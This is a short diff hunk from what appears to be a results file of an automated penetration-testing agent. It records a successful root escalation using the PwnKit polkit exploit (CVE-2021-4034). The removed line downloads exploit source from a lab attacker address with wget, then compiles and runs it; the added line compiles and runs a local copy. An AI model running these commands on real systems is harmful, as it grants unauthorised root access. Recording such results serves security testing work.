@@ -766,7 +766,7 @@ uid=0(root) gid=0(root) groups=0(root)""",
   ],
   "successful_technique": {
     "technique": "CVE-2021-4034 PwnKit polkit pkexec local privilege escalation",
-    "command": "wget http://10.10.14.5/pwnkit.c && gcc -o pwnkit pwnkit.c && ./pwnkit",
+    "command": "gcc -o pwnkit ~/CyberAgent/tools/pwnkit.c && ./pwnkit",
     "cve": "CVE-2021-4034",
     "gtfobins_entry": null,
     "mitre_id": "T1068",
